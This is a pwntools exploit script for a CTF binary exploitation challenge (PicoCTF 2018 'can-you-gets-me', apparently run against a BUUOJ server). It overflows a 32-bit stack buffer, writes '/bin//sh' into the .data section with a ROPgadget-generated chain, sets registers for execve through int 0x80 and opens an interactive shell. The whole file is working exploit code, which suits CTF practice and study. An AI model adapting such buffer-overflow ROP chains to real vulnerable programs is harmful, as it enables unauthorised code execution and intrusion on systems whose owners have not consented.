from pwn import  *
from struct import pack
from sys import argv



context(os='linux', arch='i386', log_level='debug')
binary = './pwn'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',28260) if argv[1]=='r' else process(binary)
# io= gdb.debug(binary,"break *0x400699")


#ROPgadget --binary PicoCTF_2018_can-you-gets-me  --ropchain


#本质上构造execve(0xb, “/bin/sh”, 0, 0);
# eax = 0x0b
# ebx = address of "/bin/sh"
# ecx = 0
# edx = 0



def payload():
	offset = 0x10c
	p = b'a'*(offset + 4)
	p += pack('<I', 0x0806e9cb) # pop edx ; ret
	p += pack('<I', 0x080d9060) # @ .data
	p += pack('<I', 0x080a8af6) # pop eax ; ret
	p += b'/bin'
	p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806e9cb) # pop edx ; ret
	p += pack('<I', 0x080d9064) # @ .data + 4
	p += pack('<I', 0x080a8af6) # pop eax ; ret
	p += b'//sh'
	p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806e9cb) # pop edx ; ret
	p += pack('<I', 0x080d9068) # @ .data + 8
	p += pack('<I', 0x08056040) # xor eax, eax ; ret
	p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080d9060) # @ .data
	p += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080d9068) # @ .data + 8
	p += pack('<I', 0x080d9060) # padding without overwrite ebx
	p += pack('<I', 0x0806e9cb) # pop edx ; ret
	p += pack('<I', 0x080d9068) # @ .data + 8
	p += pack('<I', 0x08056040) # xor eax, eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x0807be5a) # inc eax ; ret
	p += pack('<I', 0x080495a3) # int 0x80

	return p


p = payload()
io.recvuntil(b'We give you a little challenge, try to pwn it?')
io.send(p)
io.interactive()

